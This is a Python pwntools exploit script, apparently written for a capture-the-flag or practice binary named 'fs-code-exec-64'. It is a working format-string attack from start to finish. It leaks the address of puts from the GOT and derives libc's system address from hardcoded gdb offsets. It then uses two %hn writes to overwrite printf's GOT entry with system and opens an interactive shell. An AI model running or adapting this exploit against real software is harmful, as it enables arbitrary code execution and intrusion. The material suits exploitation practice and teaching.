#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-code-exec-64")

got_of_printf=p.elf.got['printf']
got_of_puts = p.elf.got['puts']

print(p.recv())

p.sendline("%7$s" + "BBBB" + p64(got_of_puts))

data = p.recv()

print(repr(data))
libc_puts = unpack(data[6:12], 'all', endian='little', sign=True)

"""
$1 = {<text variable, no debug info>} 0x7f5d2a721690 <_IO_puts>
$2 = {<text variable, no debug info>} 0x7f5d2a6f7390 <__libc_system>
$4 = {<text variable, no debug info>} 0x7f5d2a707800 <__printf>
"""

libc_system = libc_puts - 0x7f5d2a721690 + 0x7f5d2a6f7390


lower_16_system = libc_system & 0xffff

first = lower_16_system
upper_system = (int(libc_system & 0xffff0000) >>16)
second = upper_system - lower_16_system

buf = "%" + "%05d" % first + "x"
buf += "%10$hn"
buf += "%" + "%05d" % second + "x"
buf += "%11$hn" + "AAAAAA"
buf += p64(got_of_printf) + p64(got_of_printf+2)
print(buf)
p.sendline(buf)
p.interactive()

